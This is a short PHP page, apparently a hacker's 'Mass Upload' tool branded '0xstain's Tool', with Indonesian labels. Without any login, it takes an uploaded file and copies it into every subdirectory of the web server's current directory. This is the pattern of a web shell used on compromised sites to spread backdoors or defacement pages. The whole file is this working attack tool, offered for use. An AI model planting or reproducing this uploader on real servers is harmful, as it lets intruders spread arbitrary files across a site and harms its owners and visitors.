<?php 
$path = getcwd();
$dapat_ditulis = '<div class="success">Path : '.$path.' (Writeable)</div>';
$tidak_dapat_ditulis = '<div class="fail">Path : '.$path.' (Not Writeable)</div>';
?>
<!DOCTYPE html>
<html>
<head>
	<title>Mass Upload</title>
	<style>
		p{
			color: red;
		}
		hr{
			border-color: red;
		}
		h1{
			color: red;
		}
		footer{
			margin-top: 23%;
		}
		.success{
			color: green;
		}
		.fail{
			color: red;
		}
	</style>
</head>
<body bgcolor="black">
<center>
	<h1>0xstain</h1>
	<?php if(is_writeable($path)){
		echo $dapat_ditulis;
	} else{
		echo $tidak_dapat_ditulis;
	}?>	
	<hr>
</center>
<center>
	<form method="POST" enctype="multipart/form-data">
		<p>File : <input type="file" name="file">
		<input type="submit" name="upload" value="upload"></p>
	</form>
</center>

<?php

$scanfolder = scandir($path);
$file = $_FILES['file']['name'];
$pathsementara = $_FILES['file']['tmp_name'];
echo "<hr>";
foreach ($scanfolder as $dir) {
	if(is_dir($dir)){
		if($dir !== '..'){
			if(isset($_POST['upload'])){
				$pathmass = $path.'/'.$dir;
				$upload = copy($pathsementara, $pathmass.'/'.$file);
				if($upload){
					echo "<div class='success'>Upload Success ke ".$pathmass.'/'.$file."</div>";
				}
				else{
					echo "<div class='fail'>Gagal upload ke ".$pathmass.'/'.$file."</div>";
				}
			}
		}
	}
}
?>
<footer>
	<center>
		<hr>
		<p>0xstain's Tool</p>
	</center>
</footer>
</body>
</html>